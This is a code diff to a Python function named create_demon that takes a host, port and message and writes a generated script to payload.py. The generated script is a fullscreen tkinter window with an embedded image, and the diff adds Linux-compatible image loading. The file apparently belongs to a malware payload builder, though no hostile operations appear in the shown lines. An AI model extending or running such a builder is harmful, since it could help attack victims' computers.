@@ -1,8 +1,9 @@
-import re
+import platform
 
 def create_demon(host, port, fullscreen, demo, ghost, msg, img_base64):
     demon = """#/usr/bin/env python3
-import os, sys, socket, string, random, hashlib, getpass, platform, threading, datetime, time, PIL.Image, PIL.ImageTk, base64
+import os, sys, socket, string, random, hashlib, getpass, platform, threading, datetime, time, base64
+<import_pil>
 from tkinter import *
 from tkinter.ttk import *
 from io import BytesIO
@@ -21,9 +22,8 @@ class mainwindow(Tk):
 
         photo_code = '''<img_base64>
 '''
-        photo = PIL.Image.open(BytesIO(base64.b64decode(photo_code)))
-        resized = photo.resize((150,150), PIL.Image.ANTIALIAS)
-        photo = PIL.ImageTk.PhotoImage(resized)
+
+        <load_image>
 
         label = Label(self, image=photo, background = 'black')
         label.image = photo # keep a reference!
@@ -208,6 +208,19 @@ except KeyboardInterrupt:
 
     # Set image base64 code
     demon = demon.replace('<img_base64>', img_base64)
+
+    if platform.system() == 'Linux':
+        load_image = """photo = PhotoImage(data=photo_code)
+        photo = photo.subsample(4)"""
+
+        demon = demon.replace('<import_pil>', 'from PIL import Image, ImageTk')
+        demon = demon.replace('<load_image>', load_image)
+    else:
+        load_image = """photo = PIL.Image.open(BytesIO(base64.b64decode(photo_code)))
+        resized = photo.resize((150,150), PIL.Image.ANTIALIAS)
+        photo = PIL.ImageTk.PhotoImage(resized)"""
+        demon = demon.replace('<import_pil>', 'import PIL.Image, PIL.ImageTk')
+        demon = demon.replace('<load_image>', load_image)
 
     with open('./payload.py', 'w') as f:
         f.write(demon)
